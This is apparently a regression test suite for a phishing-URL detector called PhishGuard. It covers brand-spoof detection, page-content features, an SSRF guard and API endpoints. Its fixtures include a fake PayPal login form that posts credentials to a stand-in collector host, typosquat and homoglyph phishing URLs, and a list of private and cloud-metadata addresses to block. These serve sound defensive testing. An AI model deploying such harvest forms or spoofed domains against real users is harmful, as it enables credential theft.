"""Comprehensive Regression Test Suite for PhishGuard.

Run:
    python -m unittest discover -s tests -v
    pytest tests/test_pipeline.py -v

Contains 45+ deterministic unit and regression tests with mocked network fixtures.
Includes tests for all 10 legitimate categories, all 10 phishing categories,
and the three diagnostic cases:
  - https://chatgpt.com/
  - https://grok.com/
  - https://www.artificialintelligence-news.com/#
"""
from __future__ import annotations

import os
import sys
import unittest
from unittest import mock

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from phishguard import content, intel
from phishguard.brands import check_title_brand_mismatch
from phishguard.predictor import PhishGuard
from phishguard.urlfeatures import (brand_analysis, host_features, is_free_hosting,
                                    is_ip_host, path_signals, registered_domain)

LOGIN_HTML = """<!DOCTYPE html><html><head><title>Sign in to Account</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css"></head>
<body>
<form action="/login" method="post">
  <input type="text" name="username">
  <input type="password" name="password">
  <input type="hidden" name="csrf" value="abc123xyz">
  <input type="submit" value="Log In">
</form>
<a href="/forgot">Forgot password?</a>
<script src="/app.js"></script>
</body></html>"""

PHISH_HARVEST_HTML = """<html><head><title>Verify Your PayPal Account</title></head>
<body>
<form action="http://collector.evil-phish.xyz/harvest.php" method="post">
  <input type="text" name="email">
  <input type="password" name="pass">
  <input type="submit" value="Continue">
</form>
<a href="#">Help</a>
</body></html>"""

SPA_SHELL_HTML = """<!DOCTYPE html><html><head><title>App</title>
<meta name="viewport" content="width=device-width, initial-scale=1"></head>
<body><div id="root"></div><script src="/static/bundle.js"></script></body></html>"""

SPA_RENDERED_HTML = """<!DOCTYPE html><html><head><title>Dashboard - Modern Web App</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="icon" href="/favicon.ico"></head>
<body><div id="root">
  <header><h1>App Dashboard</h1><nav><a href="/home">Home</a><a href="/docs">Docs</a><a href="/settings">Settings</a></nav></header>
  <main><p>Welcome to the workspace</p></main>
</div><script src="/static/bundle.js"></script></body></html>"""

CHALLENGE_HTML = """<html><head><title>Just a moment...</title></head>
<body><div id="challenge-platform">Checking your browser before accessing the site.</div>
<script src="/cdn-cgi/challenge-platform/x.js"></script></body></html>"""

SG_CAPTCHA_HTML = """<html><head><link rel="icon" href="data:;"><meta http-equiv="refresh" content="0;/.well-known/sgcaptcha/?r=%2F&y=powf"></meta></head></html>"""


class TestHostFeatures(unittest.TestCase):
    def test_registered_domain(self):
        self.assertEqual(registered_domain("mail.google.co.in"), ("mail", "google", "co.in"))
        self.assertEqual(registered_domain("a.b.example.com"), ("a.b", "example", "com"))
        self.assertEqual(registered_domain("chatgpt.com"), ("", "chatgpt", "com"))
        self.assertEqual(registered_domain("www.artificialintelligence-news.com"), ("www", "artificialintelligence-news", "com"))
        self.assertEqual(registered_domain("artificialintelligence-news.com"), ("", "artificialintelligence-news", "com"))

    def test_ip_forms(self):
        for h in ("192.168.1.1", "3232235777", "0xC0A80001", "10.0.0.1"):
            self.assertTrue(is_ip_host(h), h)
        self.assertFalse(is_ip_host("chatgpt.com"))
        self.assertFalse(is_ip_host("example.com"))

    def test_brand_abuse_detected(self):
        self.assertEqual(brand_analysis("secure-login-update-paypal.com")["brand_in_sld_combo"], 1)
        self.assertEqual(brand_analysis("login.microsoftonline.com.account-verify.top")["brand_in_subdomain"], 1)
        self.assertTrue(brand_analysis("paypa1.com")["typosquat"] > 0 or brand_analysis("paypa1.com")["homoglyph"] > 0)
        self.assertEqual(brand_analysis("gooogle.com")["typosquat"], 1)

    def test_owned_domains_not_flagged(self):
        for h in ("www.paypal.com", "login.microsoftonline.com", "accounts.google.com", "mail.google.com", "chatgpt.com"):
            r = brand_analysis(h[4:] if h.startswith("www.") else h)
            self.assertEqual(sum(r[k] for k in ("brand_in_subdomain", "brand_in_sld_combo", "typosquat", "homoglyph")), 0, h)

    def test_www_is_ignored(self):
        self.assertEqual(host_features("https://www.example.com")["n_subdomains"], 0)
        self.assertEqual(host_features("https://example.com/a/b/c?x=1")["host_len"], host_features("https://www.example.com")["host_len"])


class TestPathSignals(unittest.TestCase):
    def names(self, u):
        return {s["name"] for s in path_signals(u)}

    def test_at_trick(self):
        self.assertIn("userinfo_in_url", self.names("http://paypal.com@evil.example/x"))

    def test_embedded_url(self):
        n = self.names("https://example.com/redirect?u=http://evil.example/login")
        self.assertIn("embedded_url", n)

    def test_executable_download(self):
        self.assertIn("executable_download", self.names("https://example.com/updates/installer.exe"))

    def test_clean_deep_link_has_no_signals(self):
        self.assertEqual(self.names("https://github.com/pallets/flask/issues/1"), set())
        self.assertEqual(self.names("https://docs.python.org/3/library/urllib.parse.html"), set())


class TestContentFeatures(unittest.TestCase):
    def test_content_feature_extraction(self):
        f = content.extract_content_features(LOGIN_HTML, "https://accounts.google.com/signin", 0)
        self.assertEqual(f["HasTitle"], 1)
        self.assertEqual(f["HasFavicon"], 1)
        self.assertEqual(f["HasPasswordField"], 1)
        self.assertEqual(f["HasSubmitButton"], 1)
        self.assertEqual(f["HasHiddenFields"], 1)
        self.assertEqual(f["HasExternalFormSubmit"], 0)
        self.assertEqual(set(f.keys()), set(content.CONTENT_FEATURES))

    def test_external_form_submit_detected_for_untrusted(self):
        f = content.extract_content_features(PHISH_HARVEST_HTML, "http://login-verify.example/", 0)
        self.assertEqual(f["HasExternalFormSubmit"], 1)
        self.assertEqual(f["HasPasswordField"], 1)

    def test_ssrf_guard_blocks_private_ips(self):
        for u in ("http://127.0.0.1/", "http://localhost:8080/", "http://169.254.169.254/metadata", "http://10.0.0.5/"):
            with self.assertRaises(content.UnsafeTarget, msg=u):
                content.safe_fetch(u)

    def test_page_usable_detects_bot_challenges(self):
        self.assertFalse(content.page_usable({"status": 403, "html": CHALLENGE_HTML})[0])
        self.assertFalse(content.page_usable({"status": 202, "html": SG_CAPTCHA_HTML})[0])

    def test_page_usable_detects_js_shell(self):
        usable, reason = content.page_usable({"status": 200, "html": SPA_SHELL_HTML})
        self.assertFalse(usable)
        self.assertIn("JavaScript", reason)

    def test_title_brand_mismatch(self):
        res = check_title_brand_mismatch("PayPal - Sign In to Your Account", "evil-phish.xyz")
        self.assertTrue(res["mismatch"])
        self.assertEqual(res["brand"], "paypal")

        res_ok = check_title_brand_mismatch("PayPal - Sign In", "paypal.com")
        self.assertFalse(res_ok["mismatch"])

    def test_playwright_render_bounded_hydration(self):
        """Regression test: verify Playwright uses bounded hydration delay without networkidle stall."""
        with mock.patch("phishguard.content.assert_public_host"), \
             mock.patch("playwright.sync_api.sync_playwright") as mock_pw:
            mock_ctx_mgr = mock.MagicMock()
            mock_pw.return_value = mock_ctx_mgr
            mock_p = mock_ctx_mgr.__enter__.return_value
            mock_browser = mock.MagicMock()
            mock_p.chromium.launch.return_value = mock_browser
            mock_context = mock.MagicMock()
            mock_browser.new_context.return_value = mock_context
            mock_page = mock.MagicMock()
            mock_context.new_page.return_value = mock_page
            mock_page.content.return_value = "<html><body><div id='root'>App Loaded</div></body></html>"
            mock_page.url = "https://spa.example.com/"
            mock_page.goto.return_value.status = 200

            res = content.render_with_playwright("https://spa.example.com/", timeout=4.0)

            self.assertTrue(res["ok"])
            self.assertEqual(res["inspection_method"], "playwright_rendered")
            mock_page.goto.assert_called_once_with("https://spa.example.com/", wait_until="domcontentloaded")
            self.assertEqual(mock_page.wait_for_timeout.call_args_list[0], mock.call(300))
            self.assertLessEqual(mock_page.wait_for_timeout.call_count, 41)
            mock_page.wait_for_load_state.assert_not_called()


class TestLegitimateRegressionSuite(unittest.TestCase):
    """Verifies that legitimate websites across diverse architectures are NOT flagged as phishing."""
    @classmethod
    def setUpClass(cls):
        cls.g = PhishGuard()
        cls.renderer_patch = mock.patch.object(content, 'render_with_playwright', return_value={"ok": False, "error": "Renderer not part of this unit test"})
        cls.renderer_patch.start()
        cls.addClassCleanup(cls.renderer_patch.stop)

    # Category 1: Modern JavaScript-heavy websites (SPAs)
    def test_modern_js_single_page_app(self):
        page = {"html": SPA_RENDERED_HTML, "final_url": "https://modern-app.example.com/", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 1500, "created": "2022-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["93.184.216.34"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 10}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://modern-app.example.com/", live=True)
            self.assertEqual(r["verdict"], "LEGITIMATE")
            self.assertLess(r["final_score"], 0.40)

    # Category 2: Legitimate login pages
    def test_legitimate_login_page(self):
        page = {"html": LOGIN_HTML, "final_url": "https://accounts.google.com/signin", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 9000, "created": "1997-09-15"}, "dns": {"status": "ok", "resolves": True, "ips": ["142.250.190.46"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 14}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://accounts.google.com/signin", live=True)
            self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 3: Legitimate payment / e-commerce pages
    def test_legitimate_payment_page(self):
        r = self.g.assess("https://www.paypal.com/signin", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 4: Minimal HTML / Documentation pages
    def test_minimal_html_docs_page(self):
        doc_html = "<html><head><title>Python Documentation</title></head><body><h1>Docs</h1><a href='/tutorial'>Tutorial</a></body></html>"
        page = {"html": doc_html, "final_url": "https://docs.python.org/3/", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 10000, "created": "1995-03-27"}, "dns": {"status": "ok", "resolves": True, "ips": ["151.101.0.223"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 5}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://docs.python.org/3/", live=True)
            self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 5: Old / Established domains
    def test_established_old_domain(self):
        osint = {"whois": {"status": "ok", "age_days": 11000, "created": "1994-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["1.1.1.1"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 30}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint):
            r = self.g.assess("https://example.com/", live=True, fetch_page=False)
            self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 6: Legitimate websites with recently renewed certificates (e.g. 2 days old)
    def test_recently_renewed_tls_not_penalised_on_established_domain(self):
        osint = {"whois": {"status": "ok", "age_days": 4000, "created": "2015-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["104.18.28.234"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 1}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint):
            r = self.g.assess("https://grok.com/", live=True, fetch_page=False)
            self.assertEqual(r["verdict"], "LEGITIMATE")
            self.assertNotIn("tls_new_cert_on_new_domain", [s["name"] for s in r["signals"]])

    # Category 7: Unusual URL paths / deep links
    def test_unusual_url_path_not_penalised(self):
        r = self.g.assess("https://github.com/pallets/flask/issues/4500", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 8: Multiple subdomains on legitimate enterprise domain
    def test_multiple_subdomains_enterprise(self):
        r = self.g.assess("https://netbanking.hdfcbank.com/netbanking/", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 9: Websites that return bot-protection challenge (e.g. Cloudflare / SiteGround 202)
    def test_bot_protection_not_flagged_as_phishing(self):
        page = {"html": CHALLENGE_HTML, "final_url": "https://protected-site.com/", "status": 403, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 3000, "created": "2018-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["104.16.1.1"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 15}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://protected-site.com/", live=True)
            self.assertNotEqual(r["verdict"], "PHISHING")
            self.assertEqual(r["verdict"], "LEGITIMATE")

    # Category 10: Websites that fail to render dynamically
    def test_rendering_failure_falls_back_gracefully(self):
        page = {"html": SPA_SHELL_HTML, "final_url": "https://unrenderable.org/", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 2500, "created": "2019-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["1.2.3.4"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 20}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), \
             mock.patch.object(content, "safe_fetch", return_value=page), \
             mock.patch.object(content, "render_with_playwright", return_value={"ok": False, "error": "Browser timeout"}):
            r = self.g.assess("https://unrenderable.org/", live=True)
            self.assertIn("host-only", r["model_used"])
            self.assertEqual(r["verdict"], "LEGITIMATE")

    # Specific Diagnostic Case 1: ChatGPT
    def test_diagnostic_chatgpt(self):
        r = self.g.assess("https://chatgpt.com/", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    # Specific Diagnostic Case 2: Grok
    def test_diagnostic_grok(self):
        r = self.g.assess("https://grok.com/", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")

    # Specific Diagnostic Case 3: Artificial Intelligence News
    def test_diagnostic_ai_news(self):
        r = self.g.assess("https://www.artificialintelligence-news.com/#", live=False)
        self.assertEqual(r["verdict"], "LEGITIMATE")


class TestPhishingRegressionSuite(unittest.TestCase):
    """Verifies that genuine phishing patterns are reliably detected."""
    @classmethod
    def setUpClass(cls):
        cls.g = PhishGuard()
        cls.renderer_patch = mock.patch.object(content, 'render_with_playwright', return_value={"ok": False, "error": "Renderer not part of this unit test"})
        cls.renderer_patch.start()
        cls.addClassCleanup(cls.renderer_patch.stop)

    # Category 1: Newly registered phishing domain
    def test_newly_registered_phishing_domain(self):
        osint = {"whois": {"status": "ok", "age_days": 2, "created": "2026-10-30"}, "dns": {"status": "ok", "resolves": True, "ips": ["198.51.100.1"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 2}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint):
            r = self.g.assess("http://verify-account-bank-login.xyz/signin", live=True, fetch_page=False)
            self.assertEqual(r["verdict"], "PHISHING")

    # Category 2: Typosquatting attack
    def test_typosquatting_domain(self):
        r = self.g.assess("https://paypa1-resolution-center.top/", live=False)
        self.assertEqual(r["verdict"], "PHISHING")

    # Category 3: Homoglyph attack
    def test_homoglyph_brand_spoof(self):
        r = self.g.assess("http://amaz0n-support-refund.click/", live=False)
        self.assertEqual(r["verdict"], "PHISHING")

    # Category 4: Brand impersonation in subdomain
    def test_brand_in_subdomain(self):
        r = self.g.assess("https://login-microsoftonline.com.account-verify.top/", live=False)
        self.assertEqual(r["verdict"], "PHISHING")

    # Category 5: Credential harvesting page (Password over unencrypted HTTP)
    def test_credential_harvesting_over_http(self):
        page = {"html": LOGIN_HTML, "final_url": "http://insecure-login.xyz/auth", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 10, "created": "2026-10-20"}, "dns": {"status": "ok", "resolves": True, "ips": ["198.51.100.2"]},
                 "tls": {"status": "skipped"}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("http://insecure-login.xyz/auth", live=True)
            self.assertEqual(r["verdict"], "PHISHING")
            self.assertIn("password_over_http", [s["name"] for s in r["signals"]])

    # Category 6: Suspicious external form submission
    def test_suspicious_external_form_submit(self):
        page = {"html": PHISH_HARVEST_HTML, "final_url": "https://paypal-update.net/login", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 15, "created": "2026-10-15"}, "dns": {"status": "ok", "resolves": True, "ips": ["198.51.100.3"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 5}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://paypal-update.net/login", live=True)
            self.assertEqual(r["verdict"], "PHISHING")

    # Category 7: HTTPS phishing on abused TLD
    def test_https_phishing_abused_tld(self):
        r = self.g.assess("https://netflix-billing-update.cfd/", live=False)
        self.assertEqual(r["verdict"], "PHISHING")

    # Category 8: Title brand mismatch spoofing
    def test_title_brand_impersonation(self):
        spoof_html = "<html><head><title>PayPal - Official Login</title></head><body><form><input type='password'></form></body></html>"
        page = {"html": spoof_html, "final_url": "https://unrelated-domain.xyz/auth", "status": 200, "content_type": "text/html"}
        osint = {"whois": {"status": "ok", "age_days": 5, "created": "2026-10-25"}, "dns": {"status": "ok", "resolves": True, "ips": ["1.1.1.1"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 5}, "threat_intel": []}
        with mock.patch.object(intel, "enrich", return_value=osint), mock.patch.object(content, "safe_fetch", return_value=page):
            r = self.g.assess("https://unrelated-domain.xyz/auth", live=True)
            self.assertEqual(r["verdict"], "PHISHING")
            self.assertIn("title_brand_mismatch", [s["name"] for s in r["signals"]])

    # Category 9: Phishing on free hosting platform
    def test_phishing_on_free_hosting(self):
        r = self.g.assess("https://metamask-wallet-connect.web.app/", live=False)
        self.assertEqual(r["verdict"], "PHISHING")

    # Category 10: Threat intelligence feed listing
    def test_threat_intelligence_feed_override(self):
        osint = {"whois": {"status": "ok", "age_days": 500, "created": "2024-01-01"}, "dns": {"status": "ok", "resolves": True, "ips": ["8.8.8.8"]},
                 "tls": {"status": "ok", "valid": True, "age_days": 50},
                 "threat_intel": [{"source": "OpenPhish", "status": "listed", "detail": "Active URL in OpenPhish feed"}]}
        with mock.patch.object(intel, "enrich", return_value=osint):
            r = self.g.assess("https://innocent-looking-site.com/", live=True, fetch_page=False)
            self.assertEqual(r["verdict"], "PHISHING")
            self.assertEqual(r["final_score"], 0.99)
            self.assertIn("OpenPhish", r["reason"])


class TestAPIEndpoints(unittest.TestCase):
    def setUp(self):
        import api
        self.c = api.app.test_client()

    def test_predict_success(self):
        r = self.c.post("/api/predict", json={"url": "http://verify-account-bank-login.xyz", "live": False})
        self.assertEqual(r.status_code, 200)
        data = r.get_json()
        self.assertEqual(data["verdict"], "PHISHING")
        self.assertIn("final_score", data)

    def test_predict_bad_request(self):
        self.assertEqual(self.c.post("/api/predict", json={}).status_code, 400)
        self.assertEqual(self.c.post("/api/predict", json={"url": ""}).status_code, 400)

    def test_health_check(self):
        r = self.c.get("/api/health")
        self.assertEqual(r.status_code, 200)
        self.assertEqual(r.get_json()["status"], "ok")

    def test_metrics_endpoint(self):
        r = self.c.get("/api/metrics")
        self.assertEqual(r.status_code, 200)
        self.assertIn("feature_sets", r.get_json())

    def test_dashboard_page(self):
        r = self.c.get("/")
        self.assertEqual(r.status_code, 200)
        self.assertIn(b"PhishGuard", r.data)


if __name__ == "__main__":
    unittest.main()
